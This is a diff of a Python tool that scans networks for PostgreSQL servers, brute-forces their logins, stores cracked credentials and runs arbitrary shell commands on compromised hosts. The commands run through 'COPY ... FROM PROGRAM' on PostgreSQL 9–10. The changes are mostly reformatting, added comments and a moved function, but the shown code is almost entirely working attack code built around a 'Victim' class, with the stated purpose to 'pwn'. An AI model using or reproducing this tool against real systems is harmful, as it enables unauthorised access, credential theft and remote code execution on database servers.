@@ -12,8 +12,10 @@ class Victim:
         self.username = username
         self.password = password
 
+
     def try_login(self, username='', password=''):
         return make_query(self.ip, self.port, username, password)
+
 
     def port_is_open(self):
         data = self.try_login()
@@ -22,6 +24,7 @@ class Victim:
             return False
         else:
             return True
+
 
     # Bruteforce login/password lists
     # Sets self.username, self.password if valid
@@ -38,10 +41,12 @@ class Victim:
                     return True
         return False
 
+
     def add_version(self, version):
         self.version = version
         self.major_version = int(re.findall(r'PostgreSQL (.*?)\.', version, re.IGNORECASE)[0])
         self.is_linux = any(x in version for x in ['linux', 'x86_64', 'Debian', 'Ubuntu'])
+
 
     def do_rce(self, command):
         if not command:
@@ -58,18 +63,20 @@ class Victim:
             print("[-] PSQL version is too old")
 
         print("[!] RCE '" + command + "'")
-        print(rce)
+        print(rce + "\n" + "-" * 50)
+
 
     def do_rce_v9_v10(self, command):
         make_query(self.ip, self.port, self.username, self.password, "CREATE TABLE IF NOT EXISTS debugger (id text);")
         make_query(self.ip, self.port, self.username, self.password, "COPY debugger from program '" + command + "';")
         command_result = make_query(self.ip, self.port, self.username, self.password, "SELECT id FROM debugger;")
         make_query(self.ip, self.port, self.username, self.password, "DROP TABLE debugger;")
-
         return command_result['message']
+
 
     def do_rce_v8(self, command):
         return 'RCE v8 is not implemented yet'
+
 
     def save_victim(self):
         # We cannot use r+ because file may not exist before first run. We cannot use w+ because it deletes the file.
@@ -79,12 +86,12 @@ class Victim:
         f.seek(0) # goto first position of the file to search if victim is already in the file
         host_port = self.ip + ":" + str(self.port)
         if host_port not in f.read():
-            f.seek(last_position)
+            f.seek(last_position) # goto last position of the file to write new string
             f.write(host_port + ":" + self.username + ":" + self.password + "\n")
         f.close()
 
 
-# Make PSQL query
+# Make PSQL query with psycopg2
 # Returns {'status': '', 'message': ''}
 def make_query(host, port, user, password, query='SELECT version();'):
     _result = None
@@ -114,48 +121,8 @@ def make_query(host, port, user, password, query='SELECT version();'):
     except psycopg2.Error as e:
         cur.close()
         conn.close()
-
         # print("[-] Could not '" + query + "' :", e)
         return { 'status': 'fail', 'message': str(e) }
-
-
-# Parse CLI arguments
-def parse_args():
-    parser = argparse.ArgumentParser(description='Scan network for postgreses, bruteforce passwords, pwn.')
-    parser.add_argument('targets', metavar='targets', type=str, nargs='*') # nargs='+' if targets is necessary
-    parser.add_argument('--userfile', dest='userfile',
-                        default=None, help='File with a list of users')
-    parser.add_argument('--passfile', dest='passfile',
-                        default=None, help='File with a list of passwords')
-    parser.add_argument('--command', dest='command',
-                        default=None, help='Command to execute on a target machine')
-    parser.add_argument('--port', dest='port',
-                        default=None, help='Port to connect')
-    parser.add_argument('--saved', dest='saved', action='store_true',
-                        default=False, help='Load data from saved session file')
-
-    args = parser.parse_args()
-
-    userfile_lines = []
-    passfile_lines = []
-
-    try:
-        for line in list(open(args.userfile)):
-            userfile_lines.append(line.strip())
-    except:
-        userfile_lines = ['postgres']
-    try:
-        for line in list(open(args.passfile)):
-            passfile_lines.append(line.strip())
-    except:
-        passfile_lines = ['postgres', 'postgres1']
-
-    args.userfile = userfile_lines
-    args.passfile = passfile_lines
-    args.command = args.command if args.command else ''
-    args.port = args.port if args.port else 5432
-
-    return args
 
 
 # Parse gnmap file
@@ -206,6 +173,45 @@ def load_save_file():
         return lines
     except:
         return []
+
+
+# Parse CLI arguments
+def parse_args():
+    parser = argparse.ArgumentParser(description='Scan network for postgreses, bruteforce passwords, pwn.')
+    parser.add_argument('targets', metavar='targets', type=str, nargs='*') # nargs='+' if targets is necessary
+    parser.add_argument('--userfile', dest='userfile',
+                        default=None, help='File with a list of users')
+    parser.add_argument('--passfile', dest='passfile',
+                        default=None, help='File with a list of passwords')
+    parser.add_argument('--command', dest='command',
+                        default=None, help='Command to execute on a target machine')
+    parser.add_argument('--port', dest='port',
+                        default=None, help='Port to connect')
+    parser.add_argument('--saved', dest='saved', action='store_true',
+                        default=False, help='Load data from saved session file')
+
+    args = parser.parse_args()
+
+    userfile_lines = []
+    passfile_lines = []
+
+    try:
+        for line in list(open(args.userfile)):
+            userfile_lines.append(line.strip())
+    except:
+        userfile_lines = ['postgres']
+    try:
+        for line in list(open(args.passfile)):
+            passfile_lines.append(line.strip())
+    except:
+        passfile_lines = ['postgres', 'postgres1']
+
+    args.userfile = userfile_lines
+    args.passfile = passfile_lines
+    args.command = args.command if args.command else ''
+    args.port = args.port if args.port else 5432
+
+    return args
 
 
 def main():
